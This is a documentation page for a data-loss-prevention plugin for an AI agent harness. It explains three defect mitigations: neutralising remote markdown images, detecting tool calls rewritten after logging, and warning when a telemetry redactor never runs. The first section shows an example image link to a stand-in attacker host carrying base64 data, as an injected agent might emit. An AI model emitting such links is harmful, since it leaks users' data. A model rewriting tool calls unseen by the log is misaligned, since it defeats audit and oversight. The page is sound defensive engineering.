---
title: Harness defect mitigations
nav_order: 2
---

# Harness defect mitigations

[← dsh-dlp docs](index.md)


Three of this plugin's registrations work around defects in DeepSeek Harness, not in a
deployment's configuration. **None of them closes its channel**, an upstream fix is better in
all three cases, and each is written up in `../disclosures/findings/`. They are here because we
build on these seams today and wanted the accident case narrowed while the upstream question is
open.

### Remote markdown images in assistant output (finding 001)

The web UI renders any absolute `http(s)` markdown image a model emits as a real `<img src>`,
and the harness sets no Content-Security-Policy. An injected agent emitting
`![](https://attacker.test/?d=<base64 of something you said>)` makes **your browser** issue that
request; the harness process never sees it, so no guard, no DLP pass and no audit surface here
can observe it.

This plugin wraps the `llm/stream` waterfall and replaces the destination of every inline
markdown image whose target is an absolute `http:`/`https:` URL, keeping the alt text:

```
![receipt](https://attacker.test/p?d=c2VjcmV0)   ->   ![receipt](dsh-dlp-blocked-remote-image)
```

The placeholder is deliberately not a URL, so the renderer takes its own "not an absolute
destination" arm and shows the alt text instead of fetching anything. Rewriting happens before
the text becomes an `assistant/chunk` or `assistant/message` event, so the session log and the
rendered answer agree, and it happens on streamed deltas too — a destination arriving eight
characters at a time is caught before any accumulation of it can render. The audit record names
the **hostname only**, never the path or query string, because that is where an exfiltration
payload rides.

What it does not close:

- **Only inline image syntax is matched.** A reference-style image (`![alt][ref]` with a
  `[ref]: https://…` definition elsewhere) still renders and still fetches. We do not neutralise
  those, because the definition is shared with ordinary links and killing it would break them.
- **A destination form the pattern does not model gets through** — an alt text containing `]`,
  unusual percent-encodings, or any future renderer-accepted syntax.
- **Reasoning text is not touched**, because the UI renders it as plain text rather than
  markdown. If that changes upstream, this stops covering it.
- Raw HTML needs no handling: the renderer keeps `<img …>` as literal text and no HTML enters
  the DOM. That is upstream doing the right thing, and it is why this only has to handle
  markdown.
- **This is a real behavioural change.** An assistant answer that legitimately links an image
  loses it — the user sees the alt text instead of the picture. That is why it is a switch:
  `remoteImageNeutralization: false` turns it off, and a deployment whose agents produce useful
  images should turn it off and set a CSP at whatever serves the UI instead.
- **The upstream fix is one `img-src` directive** in a Content-Security-Policy. That covers
  every form, every client, and every channel of this shape at once. This plugin's version
  covers the common syntax on one seam. Prefer the directive.

### A tool call rewritten between `tools/pre-execute` and the guard (finding 002)

The registry deep-freezes `exec.arguments` but does not freeze the execution object until
results are notified. A `tools/pre-execute` listener can therefore reassign `exec.arguments` or
`exec.name` — and reassigning `exec.name` **changes which tool body runs** — while the agent
loop appended `tool/call` from the model's own response block *before* the waterfall ran. The
durable record then describes a call that never happened, and nothing warns anyone.

This plugin snapshots each call's name and a keyed digest of its arguments at the head of the
waterfall, and compares in the guard, which runs after the whole waterfall. A mismatch is
**denied**, with an audit record naming which field changed and, when the name changed, the tool
the log recorded:

```
dsh-dlp denied "dangerous": another mounted plugin rewrote this call's name after the session
log recorded it, so the log and the presented call describe something other than what would
have run. The session log records a call to "safe". ...
```

What it does not close:

- **It detects; it does not prevent.** Preventing the rewrite means freezing an object this
  plugin does not own, which would break `tools/execute` wrappers that legitimately replace
  `exec.signal`. The tool body does not run, but the mutation still happened.
- **The snapshot is best-effort, not a floor.** It is registered with `{ prepend: true }`, so it
  runs before listeners registered earlier — but a listener registered *later* with the same
  option runs ahead of it and would be snapshotted after its own rewrite.
- **A call this plugin never saw is never a finding.** Absence of a snapshot means abstain, so
  scoped dispatches this listener does not receive pass unremarked rather than being denied.
- **It says nothing about other plugins' decisions.** A `deny` or an `ask` from another
  `tools/pre-execute` listener is ordinary traffic; a deny also skips the guard entirely, so
  nothing here is even consulted.
- **The upstream fix is better**: two `Object.defineProperty(execution, …, { writable: false })`
  calls at the mint site, or a scheduler-invariant throw naming the offending plugin. Either
  makes the rewrite impossible or fatal at the source instead of denying a call downstream of
  it. This check is not configurable, for the same reason the rest of the floor is not.

### The telemetry redactor cannot run under the shipped default (finding 008)

A `session-telemetry/record` listener mounts successfully and **silently never runs** under the
shipped `DSH_TELEMETRY_MODE=DISABLED`, because the coordinator that dispatches the waterfall is
constructed only in `FULL`/`FEEDBACK_ONLY`. Nothing is exported in that mode, so this is not a
leak — it is a verification trap: you mount a redactor, see it mount, and have verified nothing.

When `telemetryRedaction` is on, this plugin reads the mounted backend's own `sharing`
disclosure and reports on `process.stderr` **and** `ctx.logger` when the seam will never
dispatch:

```
dsh-dlp: telemetryRedaction is enabled, but the mounted session-telemetry backend reports
sharing "disabled", so nothing dispatches the session-telemetry/record waterfall and this
plugin's telemetry redaction never runs. Nothing is exported in this state, so this is not a
leak — it means the redaction rules are unverified, and they begin running the moment
telemetry is turned on. Informational only: the plugin's other seams are unaffected.
```

What it does not close:

- **It is informational and never fatal.** `DISABLED` is the safe default and the right posture
  for most deployments; the plugin mounts and every other seam runs normally.
- **It reads a disclosure, not the environment.** `DSH_TELEMETRY_MODE` is only the base
  bundle's default expression for a `mode` a deployment can also set directly, so guessing at
  the variable would be wrong. If a backend discloses `full` or `feedback-only` while
  dispatching nothing, this says nothing.
- **A backend that mounts after this plugin is answered late.** The check runs at mount if the
  service is already there and otherwise at the first session event, because absence at mount
  cannot be told apart from a load order.
- **The upstream fix is better**: warn at mount when a `session-telemetry/record` hook exists
  under `DISABLED`, or construct the coordinator unconditionally and drop after the waterfall.
  Either makes the trap visible for every listener, not only ours.

---
